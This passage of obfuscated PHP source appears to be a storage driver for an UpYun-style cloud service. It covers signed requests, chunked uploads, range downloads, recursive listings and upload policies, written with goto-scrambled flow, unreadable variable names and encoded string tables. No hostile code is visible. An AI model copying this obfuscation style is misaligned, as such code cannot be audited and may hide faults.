gmdate($a¿ŞèŒìö­[1208]); $Cƒğ™¤ÊŸ¹ = base64_encode(hash_hmac($a¿ŞèŒìö­[1246], "{$F™ÁˆĞ•”Ï}\x26{$d½‰ƒªÑñ‚}\46{$BÀÉÃ¯»Ş}", md5("{$this->userpass}"), !0)); $c¡ß›‘¸ÃÌ = array("\101\165\x74\x68\x6f\x72\x69\172\x61\x74\x69\x6f\156\x3a\x55\120\131\125\x4e\40{$this->username}\72{$Cƒğ™¤ÊŸ¹}", "\x44\x61\x74\145\x3a{$BÀÉÃ¯»Ş}"); return $c¡ß›‘¸ÃÌ; } public function ussRequest($A¿è–„­ÄÀ, $Fİß×Ñ»ª¿ = "\x47\105\x54", $fÁƒäà‘¥– = false, $DÄÚå¾ÕÛ· = false, $cæ×ÜÙÃÀá = false) { goto DòÛ»Âë¦†; DòÛ»Âë¦†: $e˜³åšœƒ  =& $_SERVER[¶ªÕß‚ØÁŸ]; $A¿è–„­ÄÀ = trim($A¿è–„­ÄÀ, $e˜³åšœƒ [8]); $a¢ñÑ›µÉÙ = "\x2f{$this->bucket}\57{$A¿è–„­ÄÀ}"; goto A°ğ³·²Ãñ; A°ğ³·²Ãñ: $Fœ˜·»ù’™ = $this->ussHeaders($a¢ñÑ›µÉÙ, $Fİß×Ñ»ª¿); if ($DÄÚå¾ÕÛ·) { $Fœ˜·»ù’™ = array_merge($Fœ˜·»ù’™, $DÄÚå¾ÕÛ·); } $bÛ‘ªÙ²ŒÖ = url_request($this->endpoint . $a¢ñÑ›µÉÙ, $Fİß×Ñ»ª¿, $fÁƒäà‘¥–, $Fœ˜·»ù’™, $cæ×ÜÙÃÀá); goto b“Ğ®…åÀ; b“Ğ®…åÀ: if (!$bÛ‘ªÙ²ŒÖ) { return array($e˜³åšœƒ [1036] => !1, $e˜³åšœƒ [1038] => $e˜³åšœƒ [1247]); } if (strtolower($Fİß×Ñ»ª¿) == $e˜³åšœƒ [194] || in_array($bÛ‘ªÙ²ŒÖ[$e˜³åšœƒ [1036]], array($e˜³åšœƒ [1104], $e˜³åšœƒ [1248]))) { $fÁƒäà‘¥– = $bÛ‘ªÙ²ŒÖ[$e˜³åšœƒ [1249]]; } else { $fÁƒäà‘¥– = json_decode($bÛ‘ªÙ²ŒÖ[$e˜³åšœƒ [1038]], !0); if (!$fÁƒäà‘¥–) { $fÁƒäà‘¥– = $bÛ‘ªÙ²ŒÖ[$e˜³åšœƒ [1038]]; } else { if (!$bÛ‘ªÙ²ŒÖ[$e˜³åšœƒ [702]] && isset($fÁƒäà‘¥–[$e˜³åšœƒ [1250]])) { $fÁƒäà‘¥– = $fÁƒäà‘¥–[$e˜³åšœƒ [1250]]; } } } return array($e˜³åšœƒ [1036] => $bÛ‘ªÙ²ŒÖ[$e˜³åšœƒ [702]], $e˜³åšœƒ [1038] => $fÁƒäà‘¥–); goto d¯‘¯ØçáÉ; d¯‘¯ØçáÉ: } public function mkfile($eçŠŸ‹â×î, $e¥‡ ­ÍÙã = '', $a¾¸º¦ ß = REPEAT_RENAME) { if ($this->setContent($eçŠŸ‹â×î, $e¥‡ ­ÍÙã)) { return $this->getPathOuter($eçŠŸ‹â×î); } return !1; } public function mkdir($AËöä‰«µ, $F‡ÒÆº›–¾ = REPEAT_SKIP) { $F£ì•Ö×÷’ =& $_SERVER[¶ªÕß‚ØÁŸ]; $a¬½˜¥´—İ = trim($AËöä‰«µ, $F£ì•Ö×÷’[8]); if ($this->_isFolder($a¬½˜¥´—İ)) { return $this->getPathOuter($a¬½˜¥´—İ); } $EĞÆö¿ê× = array($F£ì•Ö×÷’[1251]); $c‡ãˆéöÕ« = $this->ussRequest($a¬½˜¥´—İ, $F£ì•Ö×÷’[222], !1, $EĞÆö¿ê×); return $c‡ãˆéöÕ«[$F£ì•Ö×÷’[1036]] ? $this->getPathOuter($a¬½˜¥´—İ) : !1; } public function copyFile($CôèÓ…ÁÈø, $FÏºÓ‚­ë) { $f‹¬Âøñº =& $_SERVER[¶ªÕß‚ØÁŸ]; $dèÂêÄ¤’« = array($f‹¬Âøñº[1252] . "\x2f{$this->bucket}\x2f{$CôèÓ…ÁÈø}", $f‹¬Âøñº[1253]); $fŒà×•äØ = $this->ussRequest($FÏºÓ‚­ë, $f‹¬Âøñº[224], !1, $dèÂêÄ¤’«); return $fŒà×•äØ[$f‹¬Âøñº[1036]] ? !0 : !1; } public function moveFile($Eòâ«¶“ãƒ, $b¿…µñ˜¢) { $cÀµÃ¿¢Ò =& $_SERVER[¶ªÕß‚ØÁŸ]; $fŠÇ­Æ™Ò = array($cÀµÃ¿¢Ò[1254] . "\57{$this->bucket}\x2f{$Eòâ«¶“ãƒ}", $cÀµÃ¿¢Ò[1253]); $Fèá”Ëä±Ç = $this->ussRequest($b¿…µñ˜¢, $cÀµÃ¿¢Ò[224], !1, $fŠÇ­Æ™Ò); return $Fèá”Ëä±Ç[$cÀµÃ¿¢Ò[1036]] ? !0 : !1; } public function delFile($CÈÍ«Ñ‰Û) { $AË°ÖÀ—¡Â =& $_SERVER[¶ªÕß‚ØÁŸ]; $b‘Õ¼°áÖÏ = $this->ussRequest($CÈÍ«Ñ‰Û, $AË°ÖÀ—¡Â[1255]); return $b‘Õ¼°áÖÏ[$AË°ÖÀ—¡Â[1036]] ? !0 : !1; } public function delFolder($b²Â¯âĞ¿») { $dò¸ö¬ÄË­ =& $_SERVER[¶ªÕß‚ØÁŸ]; $EÖÇñ¬Ú°µ = $this->listAll($b²Â¯âĞ¿»); krsort($EÖÇñ¬Ú°µ); foreach ($EÖÇñ¬Ú°µ as $Aì¢ˆ¡§ĞŠ) { $this->ussRequest($Aì¢ˆ¡§ĞŠ[$dò¸ö¬ÄË­[85]], $dò¸ö¬ÄË­[1255]); } return $this->ussRequest($b²Â¯âĞ¿», $dò¸ö¬ÄË­[1255]); } public function rename($f…ÖÌ”—äó, $a®¿¡µ“£) { if ($this->isFile($f…ÖÌ”—äó)) { $a®¿¡µ“£ = get_path_father($f…ÖÌ”—äó) . $a®¿¡µ“£; return $this->moveFile($f…ÖÌ”—äó, $a®¿¡µ“£); } return $this->renameObject($f…ÖÌ”—äó, $a®¿¡µ“£); } public function fileInfo($dá£ÂÔÕ¾ò, $e ß™«¿À = false, $bäÂÛÙË†‘ = array()) { $FÕÁÁ—“î =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($e ß™«¿À) { return array($FÕÁÁ—“î[28] => $this->pathThis($dá£ÂÔÕ¾ò), $FÕÁÁ—“î[85] => $this->getPathOuter($FÕÁÁ—“î[8] . $dá£ÂÔÕ¾ò), $FÕÁÁ—“î[29] => $FÕÁÁ—“î[177], $FÕÁÁ—“î[87] => isset($bäÂÛÙË†‘[$FÕÁÁ—“î[334]]) ? $bäÂÛÙË†‘[$FÕÁÁ—“î[334]] : 0, $FÕÁÁ—“î[170] => $this->ext($dá£ÂÔÕ¾ò)); } $B…ÍŞ˜²ƒå = array($FÕÁÁ—“î[28] => $this->pathThis($dá£ÂÔÕ¾ò), $FÕÁÁ—“î[85] => $this->getPathOuter($FÕÁÁ—“î[8] . $dá£ÂÔÕ¾ò), $FÕÁÁ—“î[29] => $FÕÁÁ—“î[177], $FÕÁÁ—“î[197] => 0, $FÕÁÁ—“î[117] => isset($eÌˆ‡ Ì†°[$FÕÁÁ—“î[1256]]) ? $eÌˆ‡ Ì†°[$FÕÁÁ—“î[1256]] : 0, $FÕÁÁ—“î[87] => isset($bäÂÛÙË†‘[$FÕÁÁ—“î[334]]) ? $bäÂÛÙË†‘[$FÕÁÁ—“î[334]] : 0, $FÕÁÁ—“î[170] => $this->ext($dá£ÂÔÕ¾ò), $FÕÁÁ—“î[198] => !0, $FÕÁÁ—“î[199] => !0); if (empty($bäÂÛÙË†‘)) { $bäÂÛÙË†‘ = $this->objectMeta($dá£ÂÔÕ¾ò); if (!$bäÂÛÙË†‘) { return $B…ÍŞ˜²ƒå; } $B…ÍŞ˜²ƒå[$FÕÁÁ—“î[197]] = $bäÂÛÙË†‘[$FÕÁÁ—“î[1257]]; $B…ÍŞ˜²ƒå[$FÕÁÁ—“î[117]] = $bäÂÛÙË†‘[$FÕÁÁ—“î[1258]]; $B…ÍŞ˜²ƒå[$FÕÁÁ—“î[87]] = $bäÂÛÙË†‘[$FÕÁÁ—“î[87]]; } return $B…ÍŞ˜²ƒå; } public function folderInfo($A›Ñ‘¨”, $AÇÇªéÉ’ = false) { $aëŠµæĞ§ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($AÇÇªéÉ’) { return array($aëŠµæĞ§[28] => $this->pathThis($A›Ñ‘¨”), $aëŠµæĞ§[85] => $this->getPathOuter($aëŠµæĞ§[8] . $A›Ñ‘¨”), $aëŠµæĞ§[29] => $aëŠµæĞ§[86]); } $eáğ¼Ò´Í¤ = array($aëŠµæĞ§[28] => $this->pathThis($A›Ñ‘¨”), $aëŠµæĞ§[85] => $this->getPathOuter($aëŠµæĞ§[8] . $A›Ñ‘¨”), $aëŠµæĞ§[29] => $aëŠµæĞ§[86], $aëŠµæĞ§[197] => 0, $aëŠµæĞ§[117] => isset($AÑùŞóîóê[$aëŠµæĞ§[1256]]) ? $AÑùŞóîóê[$aëŠµæĞ§[1256]] : 0, $aëŠµæĞ§[1165] => !0, $aëŠµæĞ§[1166] => !0); if (empty($cˆ†ëæÕ)) { $cˆ†ëæÕ = $this->objectMeta($A›Ñ‘¨”); if (!$cˆ†ëæÕ) { return $eáğ¼Ò´Í¤; } $eáğ¼Ò´Í¤[$aëŠµæĞ§[197]] = $cˆ†ëæÕ[$aëŠµæĞ§[1257]]; $eáğ¼Ò´Í¤[$aëŠµæĞ§[117]] = $cˆ†ëæÕ[$aëŠµæĞ§[1258]]; } return $eáğ¼Ò´Í¤; } private function fileList($FŞ­¯Ó£÷¼, $fùÊ¢¸«™ = 0, $A…å¥‘õ = 1000) { $CˆÛÎë¸Ò =& $_SERVER[¶ªÕß‚ØÁŸ]; $Cöé°Ïµø— = array($CˆÛÎë¸Ò[1259], $CˆÛÎë¸Ò[1260] . $A…å¥‘õ); if ($fùÊ¢¸«™) { $Cöé°Ïµø—[] = $CˆÛÎë¸Ò[1261] . $fùÊ¢¸«™; } $F¸‚›Ê»“ = $this->ussRequest($FŞ­¯Ó£÷¼, $CˆÛÎë¸Ò[226], !1, $Cöé°Ïµø—); return !$F¸‚›Ê»“[$CˆÛÎë¸Ò[1036]] ? !1 : $F¸‚›Ê»“[$CˆÛÎë¸Ò[1038]]; } public function listPath($aÄÓ¨ÁÒïŒ, $C¥Ÿ†×Œé = false) { goto dø·Áöİ”¾; AŞ„èæè»: return array($d¢¶ÑïÇŸÚ[84] => $Aç’ì‚˜Ò½, $d¢¶ÑïÇŸÚ[83] => $E‰¹ÄÓ”¥à); goto b‹¼´Š; dø·Áöİ”¾: $d¢¶ÑïÇŸÚ =& $_SERVER[¶ªÕß‚ØÁŸ]; $d¥ä•±à” = $d¢¶ÑïÇŸÚ[33]; $dö‰‡¥Ô·Î = 1000; goto EŒµäİ¦¯î; EŒµäİ¦¯î: $Aç’ì‚˜Ò½ = $E‰¹ÄÓ”¥à = array(); $a×¥Ê¢· = rtrim($aÄÓ¨ÁÒïŒ, $d¢¶ÑïÇŸÚ[8]) . $d¢¶ÑïÇŸÚ[8]; while (!0) { $F¹¦ØªÆ÷œ = $this->fileList($aÄÓ¨ÁÒïŒ, $d¥ä•±à”, $dö‰‡¥Ô·Î); if (!$F¹¦ØªÆ÷œ) { return !1; } $d¥ä•±à” = isset($F¹¦ØªÆ÷œ[$d¢¶ÑïÇŸÚ[1262]]) ? $F¹¦ØªÆ÷œ[$d¢¶ÑïÇŸÚ[1262]] : $d¢¶ÑïÇŸÚ[33]; $cº‘óÉÌÄ = isset($F¹¦ØªÆ÷œ[$d¢¶ÑïÇŸÚ[1263]]) ? $F¹¦ØªÆ÷œ[$d¢¶ÑïÇŸÚ[1263]] : array(); foreach ($cº‘óÉÌÄ as $B°ğà¢–‚á) { if ($B°ğà¢–‚á[$d¢¶ÑïÇŸÚ[29]] == $d¢¶ÑïÇŸÚ[86]) { $Aç’ì‚˜Ò½[] = $this->folderInfo($a×¥Ê¢· . $B°ğà¢–‚á[$d¢¶ÑïÇŸÚ[28]], $C¥Ÿ†×Œé, $B°ğà¢–‚á); } else { $E‰¹ÄÓ”¥à[] = $this->fileInfo($a×¥Ê¢· . $B°ğà¢–‚á[$d¢¶ÑïÇŸÚ[28]], $C¥Ÿ†×Œé, $B°ğà¢–‚á); } } if (count($cº‘óÉÌÄ) < $dö‰‡¥Ô·Î) { break; } } goto AŞ„èæè»; b‹¼´Š: } private function recursionAllFiles($c˜ê¥ğŠ», &$bâŸÖ”) { $eÊê¿Û»Î¸ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cªæ¾àá = $eÊê¿Û»Î¸[33]; $EìÛÓ×É = 1000; $bî‚©òÕ = $dâ¦˜¼Š÷ = array(); $d‹»Á¯Î = rtrim($c˜ê¥ğŠ», $eÊê¿Û»Î¸[8]) . $eÊê¿Û»Î¸[8]; while (!0) { $a‘±Òóó¥ä = $this->fileList($c˜ê¥ğŠ», $cªæ¾àá, $EìÛÓ×É); if (!$a‘±Òóó¥ä) { return !1; } $cªæ¾àá = isset($a‘±Òóó¥ä[$eÊê¿Û»Î¸[1262]]) ? $a‘±Òóó¥ä[$eÊê¿Û»Î¸[1262]] : $eÊê¿Û»Î¸[33]; $bæ²¨‘ƒ¤ = isset($a‘±Òóó¥ä[$eÊê¿Û»Î¸[1263]]) ? $a‘±Òóó¥ä[$eÊê¿Û»Î¸[1263]] : array(); foreach ($bæ²¨‘ƒ¤ as $eÀ×¸É¸á) { $fŞ¿¡‰¢ì = array($eÊê¿Û»Î¸[85] => $d‹»Á¯Î . $eÀ×¸É¸á[$eÊê¿Û»Î¸[28]], $eÊê¿Û»Î¸[86] => $eÀ×¸É¸á[$eÊê¿Û»Î¸[29]] == $eÊê¿Û»Î¸[86] ? 1 : 0, $eÊê¿Û»Î¸[87] => isset($eÀ×¸É¸á[$eÊê¿Û»Î¸[334]]) ? $eÀ×¸É¸á[$eÊê¿Û»Î¸[334]] : 0); $bâŸÖ”[] = $fŞ¿¡‰¢ì; if ($fŞ¿¡‰¢ì[$eÊê¿Û»Î¸[86]] == 1) { $this->recursionAllFiles($fŞ¿¡‰¢ì[$eÊê¿Û»Î¸[85]], $bâŸÖ”); } } if (count($bæ²¨‘ƒ¤) < $EìÛÓ×É) { break; } } } public function has($A¿„ƒ™Œ¬Ÿ, $AØ×®Æ–İ = false, $cÌƒ™Ú’®À = true) { goto bÊ¯•öê®›; bÊ¯•öê®›: $F¨¨ÌÍ±Ø =& $_SERVER[¶ªÕß‚ØÁŸ]; $d‡èÓÇ‚¥Ô = $F¨¨ÌÍ±Ø[33]; $eìÛîõÀĞª = 1000; goto C»ƒÈ„œ·³; C»ƒÈ„œ·³: $c—÷·äÄ½” = 0; $BÇ«ÅŒ®©œ = 0; $BÅ«í‹§Ë = rtrim($A¿„ƒ™Œ¬Ÿ, $F¨¨ÌÍ±Ø[8]) . $F¨¨ÌÍ±Ø[8]; goto BÃç¤±¸·; BÃç¤±¸·: while (!0) { $dğß³™Ÿ³¸ = $this->fileList($A¿„ƒ™Œ¬Ÿ, $d‡èÓÇ‚¥Ô, $eìÛîõÀĞª); if (!$dğß³™Ÿ³¸) { return !1; } $d‡èÓÇ‚¥Ô = isset($dğß³™Ÿ³¸[$F¨¨ÌÍ±Ø[1262]]) ? $dğß³™Ÿ³¸[$F¨¨ÌÍ±Ø[1262]] : $F¨¨ÌÍ±Ø[33]; $D‰Á–ŒÀ = isset($dğß³™Ÿ³¸[$F¨¨ÌÍ±Ø[1263]]) ? $dğß³™Ÿ³¸[$F¨¨ÌÍ±Ø[1263]] : array(); if (empty($D‰Á–ŒÀ)) { break; } $BèÃêÉ¢»Õ = array_to_keyvalue($D‰Á–ŒÀ, $F¨¨ÌÍ±Ø[33], $F¨¨ÌÍ±Ø[29]); $bÆ–øÊÚ© = array_count_values($BèÃêÉ¢»Õ); $bîÔ™¥“õ = isset($bÆ–øÊÚ©[$F¨¨ÌÍ±Ø[86]]) ? $bÆ–øÊÚ©[$F¨¨ÌÍ±Ø[86]] : 0; $F•äª•Ú‹ = count($BèÃêÉ¢»Õ) - $bîÔ™¥“õ; if ($AØ×®Æ–İ) { $BÇ«ÅŒ®©œ += $bîÔ™¥“õ; $c—÷·äÄ½” += $F•äª•Ú‹; if ($B Û¤Ë—Ÿ < $eìÛîõÀĞª) { break; } continue; } if ($cÌƒ™Ú’®À) { if ($F•äª•Ú‹) { return !0; } } else { if ($bîÔ™¥“õ) { return !0; } } if (count($D‰Á–ŒÀ) < $eìÛîõÀĞª) { break; } } if ($AØ×®Æ–İ) { return array($F¨¨ÌÍ±Ø[201] => $c—÷·äÄ½”, $F¨¨ÌÍ±Ø[202] => $BÇ«ÅŒ®©œ); } return !1; goto AÜåâ•œ; AÜåâ•œ: } public function listAll($b‘ê¤í‡ƒ) { $dìçÒÁËÆ = array(); $this->recursionAllFiles($b‘ê¤í‡ƒ, $dìçÒÁËÆ); return $dìçÒÁËÆ; } public function canRead($c…ßË«ˆ×ˆ) { return $this->exist($c…ßË«ˆ×ˆ) ? !0 : !1; } public function canWrite($f‡Ó”Øí»Ó) { return $this->exist($f‡Ó”Øí»Ó) ? !0 : !1; } public function getContent($D˜ÈïØéë) { return $this->fileSubstr($D˜ÈïØéë, 0, -1); } public function setContent($EíĞœØÇ°¶, $FïŒê£ŠÎ• = '') { $F–¤«¹¡î =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$FïŒê£ŠÎ•) { $E©è²øÊ‹Ù = $this->ussRequest($EíĞœØÇ°¶, $F–¤«¹¡î[222]); return $E©è²øÊ‹Ù[$F–¤«¹¡î[1036]]; } $aÀ¯™íÚ¾á = $this->tempFile($this->pathThis($EíĞœØÇ°¶)); file_put_contents($aÀ¯™íÚ¾á, $FïŒê£ŠÎ•); if ($this->upload($EíĞœØÇ°¶, $aÀ¯™íÚ¾á)) { $this->tempFileRemve($aÀ¯™íÚ¾á); return !0; } return !1; } public function fileSubstr($d¹ÌÌ†•ˆò, $CÅ©ÔÍªö¹, $D¥ÌÄó×¥) { $BµÂŠÃõôİ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!($dùŠêÍåÇ = $this->link($d¹ÌÌ†•ˆò))) { return !1; } $D¿£±ŸìÌØ = !1; if ($D¥ÌÄó×¥ > 0) { $e¼æ¾Š‡¸ë = $CÅ©ÔÍªö¹ + $D¥ÌÄó×¥ - 1; $D¿£±ŸìÌØ = array($BµÂŠÃõôİ[1223] . $CÅ©ÔÍªö¹ . $BµÂŠÃõôİ[420] . $e¼æ¾Š‡¸ë); } $cÇ…™ÍØİ = url_request($dùŠêÍåÇ, $BµÂŠÃõôİ[226], !1, $D¿£±ŸìÌØ); return $cÇ…™ÍØİ[$BµÂŠÃõôİ[702]] ? $cÇ…™ÍØİ[$BµÂŠÃõôİ[1038]] : !1; } public function upload($EÇ¦¥›”Æ‡, $F¹¬´¹³è•, $bù‘ÜË£ĞÅ = false, $A¿„Ë‹³¤â = REPEAT_REPLACE) { goto fË¶¦ß‡©Ã; fË¶¦ß‡©Ã: $C’†ïÈ‡— =& $_SERVER[¶ªÕß‚ØÁŸ]; $BƒÃ¤ÛÔëÁ = IO::size($F¹¬´¹³è•); if ($BƒÃ¤ÛÔëÁ <= 1024 * 1024 * 200) { $Aø‚Ø·Á± = array($C’†ïÈ‡—[1264] . $F¹¬´¹³è•); $C½ÃÎŞˆô“ = $this->ussRequest($EÇ¦¥›”Æ‡, $C’†ïÈ‡—[224], $Aø‚Ø·Á±); return $C½ÃÎŞˆô“[$C’†ïÈ‡—[1036]] ? $this->getPathOuter($EÇ¦¥›”Æ‡) : !1; } goto eí©¶õÈĞ; fÅ«ë…¤¹: $C½ÃÎŞˆô“ = $this->ussRequest($EÇ¦¥›”Æ‡, $C’†ïÈ‡—[224], !1, $A‚·„ïÉŞ); return $C½ÃÎŞˆô“[$C’†ïÈ‡—[1036]] ? $this->getPathOuter($A¸İÓíğ¡³) : !1; goto fÒ‰˜×È¸; F™×’åÓ’: do { $F¸‘àº¦‡Õ = $b‹¨è£‰ñÕ[$C’†ïÈ‡—[1270]]; fseek($A‚‘ì‘î…Ò, $a‘©²™è³); $AºÉÔ‡Œˆ  = fread($A‚‘ì‘î…Ò, $F¸‘àº¦‡Õ); $CÆÍŸ¤ùÓ = 0; do { $CÆÍŸ¤ùÓ++; $b‹¨è£‰ñÕ = $this->uploadPart($EÇ¦¥›”Æ‡, $b‹¨è£‰ñÕ, $AºÉÔ‡Œˆ ); } while (!$b‹¨è£‰ñÕ && $CÆÍŸ¤ùÓ < 3); if (!$b‹¨è£‰ñÕ) { return !1; } $C›®Ê·åàî = $b‹¨è£‰ñÕ[$C’†ïÈ‡—[1269]]; $a‘©²™è³ += $F¸‘àº¦‡Õ; } while ($C›®Ê·åàî != -1); fclose($A‚‘ì‘î…Ò); $A‚·„ïÉŞ = array($C’†ïÈ‡—[1271], $C’†ïÈ‡—[1272] . $b‹¨è£‰ñÕ[$C’†ïÈ‡—[1273]], $C’†ïÈ‡—[1267]); goto fÅ«ë…¤¹; eí©¶õÈĞ: $F¼Ûåíã… = 1024 * 1024 * 10; $A‚·„ïÉŞ = array($C’†ïÈ‡—[1265], $C’†ïÈ‡—[1266] . $BƒÃ¤ÛÔëÁ, $C’†ïÈ‡—[1267], $C’†ïÈ‡—[1268] . $F¼Ûåíã…); $C½ÃÎŞˆô“ = $this->ussRequest($EÇ¦¥›”Æ‡, $C’†ïÈ‡—[224], !1, $A‚·„ïÉŞ); goto EÔ¢ÉÊè¡; eì©•Ëñòº: $C›®Ê·åàî = $b‹¨è£‰ñÕ[$C’†ïÈ‡—[1269]]; $A‚‘ì‘î…Ò = fopen($F¹¬´¹³è•, $C’†ïÈ‡—[1173]); if (!$A‚‘ì‘î…Ò) { return !1; } goto F™×’åÓ’; EÔ¢ÉÊè¡: if (!$C½ÃÎŞˆô“[$C’†ïÈ‡—[1036]]) { return !1; } $b‹¨è£‰ñÕ = $C½ÃÎŞˆô“[$C’†ïÈ‡—[1038]]; $a‘©²™è³ = 0; goto eì©•Ëñòº; fÒ‰˜×È¸: } private function uploadPart($dìˆåæÀ¤, $fà„è»á­é, &$Cõã‰Åå¶æ) { $Bá¯¡¦÷¸Á =& $_SERVER[¶ªÕß‚ØÁŸ]; $bù¨È»¨‹Š = array($Bá¯¡¦÷¸Á[1274], $Bá¯¡¦÷¸Á[1272] . $fà„è»á­é[$Bá¯¡¦÷¸Á[1273]], $Bá¯¡¦÷¸Á[1275] . $fà„è»á­é[$Bá¯¡¦÷¸Á[1269]], $Bá¯¡¦÷¸Á[148] . $fà„è»á­é[$Bá¯¡¦÷¸Á[1270]]); $C½éàĞõ = $this->ussRequest($dìˆåæÀ¤, $Bá¯¡¦÷¸Á[224], $Cõã‰Åå¶æ, $bù¨È»¨‹Š); return !$C½éàĞõ[$Bá¯¡¦÷¸Á[1036]] ? $C½éàĞõ[$Bá¯¡¦÷¸Á[1036]] : $C½éàĞõ[$Bá¯¡¦÷¸Á[1038]]; } public function uploadFormData($C‘ëĞÃ‰–Š, $a¨—‚ŞÖŒì = 3600) { return $this->uploadPolicy($C‘ëĞÃ‰–Š, $a¨—‚ŞÖŒì); } public function multiUploadFormData($f£¯”ÓÄ³î, $EÅĞÈîø‘­ = 3600) { $eó®åÏË² =& $_SERVER[¶ªÕß‚ØÁŸ]; $fš’§¯À… = (int) $GLOBALS[$eó®åÏË²[7]][$eó®åÏË²[87]]; return $this->uploadPolicy($f£¯”ÓÄ³î, $EÅĞÈîø‘­, $fš’§¯À…); } private function uploadPolicy($C“Ó¹‚‹, $Eš¢Ê™Åçã = 3600, $AÂ¨ù»ÅÜ = 0) { goto fŠø»Îƒ‰; aÕØÃºÆ½: $A÷”‚ƒõÑĞ = array($eŠò÷ùÓ[1276] => $this->bucket, $eŠò÷ùÓ[1277] => $C“Ó¹‚‹, $eŠò÷ùÓ[1278] => time() + $Eš¢Ê™Åçã, $eŠò÷ùÓ[1279] => $A¨±ßÎ«ßØ); if ($AÂ¨ù»ÅÜ) { $A÷”‚ƒõÑĞ[$eŠò÷ùÓ[1194]] = $AÂ¨ù»ÅÜ; } $CÕ‚ìÊÙˆ– = base64_encode(json_encode($A÷”‚ƒõÑĞ)); goto Fçƒî¿èÇÛ; Fçƒî¿èÇÛ: $AÛõ––¦É = base64_encode(hash_hmac($eŠò÷ùÓ[1246], "\x50\x4f\123\x54\46{$DÕÌíä’ë}\46{$A¨±ßÎ«ßØ}\46{$CÕ‚ìÊÙˆ–}", md5("{$this->userpass}"), !0)); $aîÓ¿œÒ†æ = array($eŠò÷ùÓ[1116] => $CÕ‚ìÊÙˆ–, $eŠò÷ùÓ[1280] => "\125\120\131\125\116\x20{$this->username}\x3a{$AÛõ––¦É}", $eŠò÷ùÓ[179] => $this->endpoint . $DÕÌíä’ë); return $aîÓ¿œÒ†æ; goto BË²½°¦æÏ; fŠø»Îƒ‰: $eŠò÷ùÓ =& $_SERVER[¶ªÕß‚ØÁŸ]; $DÕÌíä’ë = $eŠò÷ùÓ[8] . $this->bucket; $A¨±ßÎ«ßØ = gmdate($eŠò÷ùÓ[1208]); goto aÕØÃºÆ½; BË²½°¦æÏ: } public function download($B–‰—Œ™Üá, $c¥µÛ³·å) { goto bÙù¢ø©; f­Í ¯íÛ: fclose($EµÎÈ×Ğ); return $c¥µÛ³·å; goto f‰íóğÜ°; CÉÓ÷²: $cĞÛÊÎ²’Ç = 1024 * 200; $EµÎÈ×Ğ = fopen($dÊ»’àİß³, $_SERVER[¶ªÕß‚ØÁŸ][1229]); while (!0) { $B³¦†ŞæŠÎ = $this->fileSubstr($B–‰—Œ™Üá, $fÚ˜Îé†ßƒ, $cĞÛÊÎ²’Ç); if ($B³¦†ŞæŠÎ === !1) { return !1; } fwrite($EµÎÈ×Ğ, $B³¦†ŞæŠÎ); $fÚ˜Îé†ßƒ += $cĞÛÊÎ²’Ç; if (strlen($B³¦†ŞæŠÎ) < $cĞÛÊÎ²’Ç) { break; } } goto f­Í ¯íÛ; bÙù¢ø©: $dÊ»’àİß³ = IO::getPathInner(IO::mkfile($c¥µÛ³·å)); if (!($a³—Òï°á = $this->link($B–‰—Œ™Üá))) { return !1; } $fÚ˜Îé†ßƒ = 0; goto CÉÓ÷²; f‰íóğÜ°: } public function link($C‹¿Åšµ˜, $bÈâÇâÃ·ˆ = array()) { $B—ŒÄ¨ğÁ =& $_SERVER[¶ªÕß‚ØÁŸ]; $C‹¿Åšµ˜ = trim($C‹¿Åšµ˜, $B—ŒÄ¨ğÁ[8]); if (!empty($this->token)) { $D°êÆ“Ñ = strtotime(date($B—ŒÄ¨ğÁ[1281])); $AÎšÌçÆ = substr(md5($this->token . $B—ŒÄ¨ğÁ[281] . $D°êÆ“Ñ . $B—ŒÄ¨ğÁ[1282] . $C‹¿Åšµ˜), 12, 8) . $D°êÆ“Ñ; $bÈâÇâÃ·ˆ[] = $B—ŒÄ¨ğÁ[1283] . $AÎšÌçÆ; } $dêË¸ÇƒÂÂ = !empty($bÈâÇâÃ·ˆ) ? $B—ŒÄ¨ğÁ[79] . implode($B—ŒÄ¨ğÁ[281], $bÈâÇâÃ·ˆ) : $B—ŒÄ¨ğÁ[33]; return $this->getHost() . $B—ŒÄ¨ğÁ[8] . $C‹¿Åšµ˜ . $dêË¸ÇƒÂÂ; } public function fileOut($b…Î—…æõÊ, $dØ®ô¨›ˆê = false, $b…¡Äƒß» = false, $d‹£Š™ŠÙÛ = '') { if (!$b…¡Äƒß») { $b…¡Äƒß» = $this->pathThis($b…Î—…æõÊ); } $E—ºÍÄ–Â÷ = $dØ®ô¨›ˆê ? array($_SERVER[¶ªÕß‚ØÁŸ][1284] . rawurlencode($b…¡Äƒß»)) : array(); $FÆ¤‰Ş¹ = $this->link($b…Î—…æõÊ, $E—ºÍÄ–Â÷); $this->fileOutLink($FÆ¤‰Ş¹); } public function fileOutServer($F¢å‹ÜÒ‚Œ, $FºêÒäÌ· = false, $F”´âåÎ÷ã = false, $d¹í‰ØÓ“Ì = '') { parent::fileOut($F¢å‹ÜÒ‚Œ, $FºêÒäÌ·, $F”´âåÎ÷ã, $d¹í‰ØÓ“Ì); } public function fileOutImage($D™Œ„¬Ù, $cç‰î„´»‚ = 250) { $Cõ‰‹•âáë = $this->link($D™Œ„¬Ù . $_SERVER[¶ªÕß‚ØÁŸ][1285] . $cç‰î„´»‚); $this->fileOutLink($Cõ‰‹•âáë); } public function fileOutImageServer($a”Âİ¼½ğ, $c¸ˆÆ¶Š‚Œ = 250) { parent::fileOutImage($a”Âİ¼½ğ, $c¸ˆÆ¶Š‚Œ); } public function hashMd5($bæêÒîóä¬) { $BÄñ·Ş­ã… =& $_SERVER[¶ªÕß‚ØÁŸ]; $f÷ªÀƒºˆê = $this->objectMeta($bæêÒîóä¬); return isset($f÷ªÀƒºˆê[$BÄñ·Ş­ã…[206]]) ? $f÷ªÀƒºˆê[$BÄñ·Ş­ã…[206]] : !1; } public function size($E»ÓÛå¿£) { $E¹¥’Öê¬ = $this->objectMeta($E»ÓÛå¿£); return $E¹¥’Öê¬ ? $E¹¥’Öê¬[$_SERVER[¶ªÕß‚ØÁŸ][87]] : 0; } public function info($A³êßÇ¬·) { if ($this->isFolder($A³êßÇ¬·)) { return $this->folderInfo($A³êßÇ¬·); } else { if ($this->isFile($A³êßÇ¬·)) { return $this->fileInfo($A³êßÇ¬·); } } return !1; } public function exist($C ·¨í›) { return $this->isFile($C ·¨í›) || $this->isFolder($C 